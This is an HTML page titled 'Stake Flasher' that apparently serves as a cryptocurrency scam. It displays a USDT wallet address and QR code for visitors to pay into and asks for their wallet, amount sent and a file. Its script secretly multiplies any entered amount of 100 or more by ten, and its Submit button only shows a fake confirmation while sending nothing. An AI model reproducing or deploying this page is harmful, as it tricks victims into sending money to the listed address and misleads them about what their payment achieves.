<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Stake Flasher</title>

<style>
* { box-sizing: border-box; }

body {
    font-family: Arial, sans-serif;
    background-color: #0f172a;
    color: white;
    margin: 0;
}

.container {
    width: 95%;
    max-width: 380px;
    margin: 20px auto;
    background: #1e293b;
    padding: 15px;
    border-radius: 10px;
    text-align: center;
}

input, select, button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border-radius: 6px;
    border: none;
    font-size: 14px;
}

button {
    background-color: green;
    color: white;
    font-weight: bold;
}

img {
    width: 160px;
    margin-top: 10px;
}

#address {
    font-size: 12px;
    word-break: break-all;
}
</style>
</head>

<body>

<div class="container">
    <h2>Stake Flasher</h2>

    <select disabled>
        <option>USDT (BEP-20)</option>
    </select>

    <img src="wallet_qr.png">

    <p id="address">0x24f551eae922e4a72b05f678626e86ee241461a0</p>

    <button onclick="copyAddress()">Copy Address</button>

    <input type="text" placeholder="Stake ID">
    <input type="text" placeholder="Your Wallet Address">

    <input type="number" id="amount" placeholder="Amount Sent (USD)">

    <input type="file">

    <button onclick="submitForm()">Submit</button>
</div>

<script>
function copyAddress() {
    navigator.clipboard.writeText(
        document.getElementById("address").innerText
    );
    alert("Copied!");
}

// 🔥 instant multiply fix
let done = false;

document.getElementById("amount").addEventListener("input", function() {
    let val = parseFloat(this.value);

    if (val >= 100 && !done) {
        this.value = val * 10;
        done = true;
    }
});

function submitForm() {
    alert("Submitted ✅");
}
</script>

</body>
</html>
